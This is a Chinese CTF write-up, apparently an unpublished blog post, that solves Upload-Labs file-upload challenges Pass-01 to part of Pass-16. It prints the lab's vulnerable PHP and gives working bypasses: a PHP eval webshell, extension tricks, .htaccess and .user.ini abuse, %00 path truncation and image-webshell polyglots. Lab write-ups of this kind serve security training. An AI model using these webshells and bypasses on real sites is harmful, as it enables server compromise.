---
layout: post
title: Upload-Labs-Linux WriteUp
date: 2025-11-22 19:00:00 +0800
category: 技术向
tags: [CTF]
locale: zh_CN
math: true
published: false
---

## Pass-01（前端检测后缀名）

**题目：**

上传一个webshell到服务器。

```js
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

第一关是在前端用 js 限制了上传文件后缀，后端并没有做强校验，我们在浏览器禁用 javascript 即可绕过。

例如：（webshell.php）

```
<?php @eval($_POST['cmd']);?>
```

上传后发现路径是 `/upload/webshell.php` 直接用蚁剑连接，密码就是 `cmd`。

访问服务器即可在 `/flag` 目录拿到 flag：`flag{32ec95ba-3139-47d8-a1ac-72c2d0da6ddc}`。

![connect](https://s1.bpoj.top/00ddd445feb6c3732d90ca974e212f7f.png)

![flag](https://s1.bpoj.top/8f5aa5d4846de4926091139d5509cce4.png)

还有一个方法是抓包上传文件的请求，绕过前端检查伪造请求直接上传文件，也能实现一样的效果。

```
post /Pass-01/index.php

form-data:
{
    upload_file: <your file>,
    submit: '上传'
}
```

## Pass-02（后端检测 MIME 类型）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

这一关在后端校验了上传文件的 MIME 类型，我们可以使用抓包工具，拦截上传请求，修改 `multipart/form-data` 中上传部分的 `Content-Type` 值后再放包。

这里我用的是 fiddler 工具，在请求前添加断点，更改后放包，上传成功后使用蚁剑连接，拿到 flag（与 Pass-01 相同）。

![fiddler](https://s1.bpoj.top/14de70c101a4e52442f850da1a2f9fb6.png)

## Pass-03（后端后缀名黑名单检测）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关在后端限制上传 .asp\|.aspx\|.php\|.jsp 后缀文件。还是一样的方法，抓包把文件名从 `webshell.php` 改为 `webshell.php3` 即可。

## Pass-04（后端后缀名黑名单检测-.htaccess 解析绕过）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关增加了黑名单数量，我们可以尝试注入 `.htaccess` 文件。

（这个文件是 Apache 服务器中的配置文件，优先级较高，作用于当前目录，可覆盖 Apache 的主要配置文件 `httpd.conf`）

在 `.htaccess` 文件中写 `SetHandler application/x-httpd-php`，表示所有文件都当作 php 文件解析。

然后我们上传一个内容为 `<?php @eval($_POST['cmd']);?>` 的 `webshell.txt` 即可。在蚁剑中将地址换为 `/upload/webshell.txt` 即可拿到 flag。

## Pass-05（后端后缀名检测-大写绕过）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

发现没有对后缀名的大小写校验，直接改包把 `webshell.php` 改成 `webshell.Php` 即可上传。

在蚁剑里写 `/upload/<filename>` 连接。

---

还有第二种版本的题目。

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(
            ".php", ".php5", ".php4", ".php3", ".php2", 
            ".pHp", ".pHp5", ".pHp4", ".pHp3", ".pHp2",
            ".html", ".htm", ".phtml", ".pht",
            ".Html", ".Htm", ".pHtml",
            ".jsp", ".jspa", ".jspx", ".jsw", ".jsv", ".jspf", ".jtml",
            ".jSp", ".jSpx", ".jSpa", ".jSw", ".jSv", ".jSpf", ".jHtml",
            ".asp", ".aspx", ".asa", ".asax", ".ascx", ".ashx", ".asmx", ".cer",
            ".aSp", ".aSpx", ".aSa", ".aSax", ".aScx", ".aShx", ".aSmx", ".cEr",
            ".sWf", ".swf",
            ".htaccess"
        );
        $file_name = trim($_FILES['upload_file']['name']);  // 去除首尾空格
        $file_name = deldot($file_name);    // 删除文件名末尾的点（防御file.php.攻击）
        $file_ext = strrchr($file_name, '.');  // 获取文件扩展名（从最后一个点开始）
        $file_ext = strtolower($file_ext);     // 统一转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext); // 去除NTFS备用数据流
        $file_ext = trim($file_ext);           // 去除扩展名首尾空格

        // 检查文件扩展名是否在黑名单中
        if (!in_array($file_ext, $deny_ext)) {
            // 获取上传的临时文件路径
            $temp_file = $_FILES['upload_file']['tmp_name'];
            // 构造目标文件路径（使用原始文件名，存在安全隐患）
            $img_path = UPLOAD_PATH.'/'.$file_name;
            
            // 将临时文件移动到目标位置
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;  // 标记上传成功
            } else {
                $msg = '上传出错！';  // 文件移动失败（可能权限不足或目录不可写）
            }
        } else {
            $msg = '此文件类型不允许上传！';  // 文件类型被禁止
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';  // 上传目录不存在
    }
}
?>
```

**提示信息：上传目录存在 `readme.php` 文件。**

这一关把 `.htaccess` 给 ban 了，并且没有重写文件名，上传目录存在 php 文件。满足这些条件，我们可以采用 `.user.ini` 绕过。（和 `.htaccess` 类似，可覆盖 PHP 的全局配置文件 `php.ini`）

我们在 `.user.ini` 文件中写：

```
auto_prepend_file=webshell.png
```

表示在页面底部的 php 里自动包含 `webshell.png` 这个文件，然后拦截上传的包，将 `webshell.php` 改名 `webshell.png` 上传，用蚁剑连接 `/upload/readme.php` 即可。

## Pass-06（后缀名检测-尾部空格绕过（windows））

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一题把大小写校验了，但没有校验空格，可以考虑空格绕过。

利用 Windows 系统的文件名特性。在文件名最后增加空格，例如 `webshell.php `，上传后在系统上的文件名会将最后的空格去掉，实际上保存的文件就是 `webshell.php`。

老方法，抓包在文件名后面加空格即可。

但是由于 buuctf 的靶机是 linux，所以实际在系统里存储的还是 `webshell.php `（带空格），可以换用 windows 靶机尝试。

> Linux 系统可以使用 `ls -b` 命令显示文件名中非打印字符（如空格、制表符、换行符等）的反斜杠转义形式。

## Pass-07（后端后缀名检测-尾部 . 绕过）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

提示信息：本 pass 禁止上传所有可以解析的后缀！

构造文件名 `webshell.php.`，这样 `$file_ext` 实际获取到的是 `.`，不在黑名单内，文件就上传成功。

最后使用蚁剑 getshell。

## Pass-08（后端后缀名检测-尾部 ::$DATA 绕过（windows））

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

在 windows 系统中，`::$DATA` 是 NTFS 文件系统上的特性，用于表示文件的默认数据流。它是文件系统中隐藏的属性，用于存储文件的实际内容。

当文件名后附加 `::$DATA` 时，windows 会忽略 `::$DATA`，并将其视为文件的默认数据流。

我们可以拦截上传包，将 filename 改成 `webshell.php::$DATA`（`::$DATA` 是 windows 的特性，linux 平台无法利用）。

## Pass-09（后端后缀名检测-尾部 `.空格.` 绕过（windwos））

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

在 windows 平台下，如果文件名是 `webshell.php. `，会被存储为 `webshell.php`。

本题与 Pass-06 不同的是，Pass-06 是自定义文件名然后与 `file_ext` 拼接，而本题直接拼接 `file_name`。由于本题删除掉了末尾的 `.`，如果想实现 Pass-06 尾部空格的效果，应该写成 `webshell.php. .`，也就是在末尾再加一个 `.`。

这样最终获取到的 `$file_ext` 就是 `.`，可以绕过黑名单检测。

用蚁剑 `/upload/webshell.php.` 成功 getshell。

## Pass-10（后缀黑名单检测-嵌套双写绕过）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

首先上传文件测试，发现上传的文件变成了 `/upload/webshell.`，把后缀名过滤掉了，再试一下 jpg 类型，发现没有检测MIME类型。

文件名也没有强制转小写及重命名，我们尝试双写后缀绕过。

发现 `webshell.phpphp` 还是会被过滤成 `webshell.`，继续尝试嵌套 `webshell.pPHPhp`，成功上传，说明并不会递归过滤（str_ireplace 并不会二次过滤）。

最后蚁剑 `/upload/webshell.php` getshell。

## Pass-11（后缀白名单+上传路径GET可控-`%00` 截断）

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

尝试上传文件发现路径是 `/Pass-11/index.php?save_path=../upload/`，观察代码发现文件路径的拼接参数中 `$_GET['save_path']` 是可控的。

考虑如果：`save_path` 为 `../upload/webshell.php%00`，实际 `webshell.php` 文件名改为 `test.png`，这样 `img_path` 实际为：

```
../upload/webshell.php%00/6320251028134901.png
```

`move_uploaded_file` 函数移动文件的时候，遇到 `%00`（空字节）后面就不处理了，所以实际上执行的 `img_path` 为：

```
../upload/webshell.php
```

达到了我们的目的。最后用蚁剑 getshell。

## Pass-12（后缀白名单+上传路径POST可控-`%00` 截断）

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这题与上一题区别在于，上传路径放在 POST 的参数里了。做法类似，构造类似 `../upload/webshell.php%00` 的路径即可。

```text
------WebKitFormBoundaryKj0wwXAfyH0Gz9ZB
Content-Disposition: form-data; name="save_path"

../upload/webshell.php%00
------WebKitFormBoundaryKj0wwXAfyH0Gz9ZB
Content-Disposition: form-data; name="upload_file"; filename="test.png"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']);?>
------WebKitFormBoundaryKj0wwXAfyH0Gz9ZB
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryKj0wwXAfyH0Gz9ZB--
```

## Pass-13（文件头检测-图片木马+文件包含）

**题目：**

任务
上传 `图片马` 到服务器。

注意：

1.保证上传后的图片马中仍然包含完整的 `一句话` 或 `webshell` 代码。

2.使用 `文件包含漏洞` 能运行图片马中的恶意代码。

3.图片马要 `.jpg`,`.png`,`.gif` 三种后缀都上传成功才算过关！

文件包含漏洞：

```php
<?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?>
```

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这题要我们上传图片马，我们可以用 16 进制编辑器（如 010 Editor）将木马放在图片文件的末尾。

我们准备一个图片 upd.jpg 和木马 webshell.php。

在对应目录的命令行执行 `copy upd.jpg /b + webshell.php /a res.jpg`，这里的 `/b` 是以二进制模式处理，`/a` 是以 ASCII 模式处理，res.jpg 是生成的新图片的名称。

![res.jpg](https://s1.bpoj.top/fca25e898a4d4471a3cb2c285f91a47a.png)

用 16 进制编辑器打开看到成功将木马写入图片中：

![view res.jpg](https://s1.bpoj.top/3384d03216a1e5978d4596b4925912f9.png)

上传 res.jpg 后打开文件包含漏洞页面，阅读代码，发现 GET 有 `file` 参数就包含这个文件。

这里如果直接访问图片不会执行 php，必须有文件包含漏洞。

我们打开 `/include.php?file=upload/3120251029182400.jpg` 页面可以看到成功加载了 jpg 图片，用蚁剑链接。

---

还有一种方法制作图片木马：

了解一下 jpg 文件。

![jpg](https://s1.bpoj.top/092b7e57cc50b975c8a1d7159ae63fca.png)

jpg 文件以 SOI 标记 `FF D8` 开头，以 EOI 标记 ``FF D9`` 结尾，文件头后面跟一个 APP 段，常见的有 `FF E0` 和 `FF E1`。后续就是文件的其他元数据和图像数据。

jpg 文件幻数就是用文件开头的一段字节来识别文件类型。

我们可以将 php 木马文件加上 jpg 文件的幻数来骗过类型检测。

例如，使用幻数：

```
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00
```

将 webshell.php 改名为 webshell.jpg，然后用十六进制编辑器（010 Editor）打开，加上 jpg 文件的幻数。

![](https://s1.bpoj.top/12fc3c3aceea8564a3ce84bb5f02ca77.png)

在开头插入一段 16 进制的字节。

![insert](https://s1.bpoj.top/c0e712f72e155785f5e33bee0713f94d.png)

改成 jpg 文件的文件头并保存。

![hex](https://s1.bpoj.top/e65a21fcbc93b5d4c84c90fa0ab2afe7.png)

最后访问上传的 webshell.jpg 图片，利用文件包含漏洞 getshell 即可。

同理，png 和 gif 图片也可以做类似的图片马。

- png：`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`
- gif：`47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33`

审计代码看到只检查了前两个字节，所以 jpg 文件头可以只写 `FF D8`。

## Pass-14（getimagesize 文件类型检测-图片木马+文件包含）

题目和上一关一样。

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

提示：本 pass 使用 getimagesize() 检查是否为图片文件！

首先了解一下 php 中的 getimagesize 函数。

getimagesize 会读取文件的前几个字节，并与已知的文件头进行匹配，来判断文件是否为有效的图像文件。

常见的图像文件头：

- JPG 文件：文件头通常是 `FF D8 FF`。
- PNG 文件：文件头是 `89 50 4E 47 0D 0A 1A 0A`。
- GIF 文件：文件头是 `47 49 46 38 39 61` 或 `47 49 46 38 37 61`。

getimagesize 会返回图像宽度、图像高度、图像类型（如 IMG_JPG、IMG_PNG 等）、文本字符串（包含宽度和高度的 HTML width 和 height 属性）以及图像的 MIME 类型。

查看代码，仅检查了图像的类型信息（`$info[2]`），我们可以尝试将木马插入图片尾部。（方法与 Pass-13 类似，jpg/png/gif 均可）

---

还有一种方法。

GIF89a 中文名称“图形交换格式编号89A”，一个 GIF89a 图形文件就是一个根据图形交换格式（GIF）89a 版进行格式化之后的图形。

我们可以在文件起始位置加上 GIF89a，这样文件就会被 getimagesize 认为是一个 gif 图像文件。

![upload](https://s1.bpoj.top/9d98a456c53096fc623d99fcea168cbf.png)

我们修改一下 Content-Type 并在文件开头加上 GIF89a。

![upd](https://s1.bpoj.top/17b5980f2c19b518460785d98ec2d95c.png)

放包，发现文件成功上传。

![](https://s1.bpoj.top/9334cad1fa85014604fd6cb868ddf93e.png)

## Pass-15（exif_imagetype 文件类型检测-图片木马+文件包含）

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这一关换成 exif_imagetype 方法了，这个函数的原理是读取图像文件的第一个字节并检查其签名（幻数）来确定文件类型。

原理差不多，都是检查文件头，上一关的方法也适用于本关。

## Pass-16（二次渲染绕过-gif/png/jpg）

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

这一关将图片重新渲染了，主要作用是破坏掉其中的恶意代码。

使用 imagecreatefromjpeg/imagecreatefrompng/imagecreatefromgif 函数对图片进行二次渲染，属于 GD 图像库。

我们可以考虑先上传一张正常的图片，寻找渲染后的图片与原始图片对比不变的数据块，将木马插入到这些部分中。

### gif：

查看上传的图片，与原始图片进行比较。

![cmp](https://s1.bpoj.top/bcc0267af95b8acfee855d4a0954553b.png)

找出其中地址和大小都尽量匹配的数据块，如图所示：

![](https://s1.bpoj.top/c007cac5f3cac545f1246916635f0688.png)

在这些没有改变的地方插入木马：

